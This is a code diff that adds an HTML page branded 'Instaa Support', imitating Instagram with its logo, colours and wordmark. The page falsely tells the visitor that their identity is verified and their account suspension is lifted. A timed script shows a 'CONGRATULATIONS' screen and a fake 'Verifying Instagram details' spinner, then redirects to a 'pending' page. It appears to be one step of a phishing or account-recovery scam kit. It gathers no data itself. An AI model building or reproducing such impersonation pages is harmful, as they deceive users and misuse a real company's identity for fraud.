@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instaa Support</title>
+    <style>
+        /* --- General Settings --- */
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa; /* Instagram Light Background */
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            box-sizing: border-box;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* --- 1. CONGRATS POPUP (Layer 3 - Sabse Upar) --- */
+        #congrats-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            /* Instagram Gradient */
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            transition: opacity 0.5s ease;
+        }
+
+        .congrats-text {
+            color: #ffffff;
+            font-size: 10vw; 
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: popIn 0.5s ease-out;
+            text-align: center;
+            padding: 0 10px;
+        }
+
+        /* --- 2. PROCESSING OVERLAY (Layer 2 - Congrats ke peeche) --- */
+        #processing-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            /* Safed rang 90% opacity */
+            background-color: rgba(255, 255, 255, 0.95); 
+            backdrop-filter: blur(5px); 
+            display: flex; 
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            /* Instagram Purple/Pink for spinner border */
+            border-top: 4px solid #C13584; 
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        .processing-text {
+            /* Instagram Gradient Text effect for Loading */
+            background: -webkit-linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 18px;
+            font-weight: 700;
+            text-align: center;
+            line-height: 1.4;
+        }
+
+        .sub-text {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-top: 5px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.5); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        /* --- 3. MAIN CONTENT (Layer 1 - Sabse Niche) --- */
+        #main-content {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            /* Ye background me rahega isliye thoda blur/grayscale taaki loading focus me rahe */
+            filter: grayscale(30%) blur(1px);
+        }
+
+        .card {
+            background-color: transparent;
+            padding: 20px 10px;
+            width: 100%;
+        }
+
+        .ig-logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 15px;
+            fill: url(#ig-gradient); 
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
+        }
+
+        .ig-wordmark {
+            color: #000;
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 40px;
+            display: block;
+            letter-spacing: -0.5px;
+        }
+
+        .success-icon {
+            color: #42b72a;
+            font-size: 70px;
+            margin-bottom: 25px;
+            display: block;
+        }
+
+        h1 {
+            color: #262626;
+            font-size: 24px;
+            font-weight: 700;
+            margin: 0 0 12px 0;
+            line-height: 1.2;
+        }
+
+        p {
+            color: #8e8e8e;
+            font-size: 16px;
+            line-height: 1.5;
+            margin: 0 0 30px 0;
+            padding: 0 10px;
+        }
+
+        .btn {
+            background-color: #0095f6; /* Instagram Blue */
+            color: white;
+            border: none;
+            padding: 14px 0;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            display: block;
+            opacity: 0.6; /* Thoda dim kyunki background me hai */
+        }
+
+    </style>
+</head>
+<body>
+
+    <div id="congrats-popup">
+        <div class="congrats-text">CONGRATULATIONS</div>
+    </div>
+
+    <div id="processing-overlay">
+        <div class="spinner"></div>
+        <div class="processing-text">
+            Account Recovery<br>Restore Processing...
+        </div>
+        <div class="sub-text">Verifying Instagram details...</div>
+    </div>
+
+    <div id="main-content">
+        <div class="card">
+            <svg class="ig-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+                <defs>
+                    <linearGradient id="ig-gradient" x1="0%" y1="100%" x2="100%" y2="0%">
+                        <stop offset="0%" style="stop-color:#f09433;stop-opacity:1" />
+                        <stop offset="25%" style="stop-color:#e6683c;stop-opacity:1" />
+                        <stop offset="50%" style="stop-color:#dc2743;stop-opacity:1" />
+                        <stop offset="75%" style="stop-color:#cc2366;stop-opacity:1" />
+                        <stop offset="100%" style="stop-color:#bc1888;stop-opacity:1" />
+                    </linearGradient>
+                </defs>
+                <path d="M349.33,69.33a93.62,93.62,0,0,1,93.34,93.34V349.33a93.62,93.62,0,0,1-93.34,93.34H162.67a93.62,93.62,0,0,1-93.34-93.34V162.67a93.62,93.62,0,0,1,93.34-93.34H349.33m0-37.33H162.67C90.8,32,32,90.8,32,162.67V349.33C32,421.2,90.8,480,162.67,480H349.33C421.2,480,480,421.2,480,349.33V162.67C480,90.8,421.2,32,349.33,32Z"/>
+                <path d="M256,128A128,128,0,1,0,384,256,128,128,0,0,0,256,128Zm0,218.67A90.67,90.67,0,1,1,346.67,256,90.67,90.67,0,0,1,256,346.67Z"/>
+                <circle cx="386.67" cy="125.33" r="24"/>
+            </svg>
+            
+            <span class="ig-wordmark">Instagram</span>
+
+            <div class="success-icon">✓</div>
+
+            <h1>Access Restored</h1>
+            
+            <p>We have successfully verified your identity. The suspension on your Instagram account has been lifted.</p>
+            
+            <button class="btn">Go to Feed</button>
+        </div>
+    </div>
+
+    <script>
+        window.onload = function() {
+            const congratsPopup = document.getElementById('congrats-popup');
+            
+            // Step 1: 3 Seconds wait for Congratulations
+            setTimeout(() => {
+                
+                // Fade out Congrats 
+                congratsPopup.style.opacity = '0'; 
+                
+                // 0.5 sec baad Congrats ko display se hata do taaki click block na kare
+                setTimeout(() => {
+                    congratsPopup.style.display = 'none';
+
+                    // Step 2: Ab 4 Second wait karo Processing dikhane ke liye aur Redirect karo
+                    setTimeout(function() {
+                        // New Redirect URL
+                        window.location.href = "insta_successful_pending.html";
+                    }, 4000); 
+
+                }, 500); // 0.5s fade timing match
+
+            }, 3000); 
+        };
+    </script>
+
+</body>
+</html>
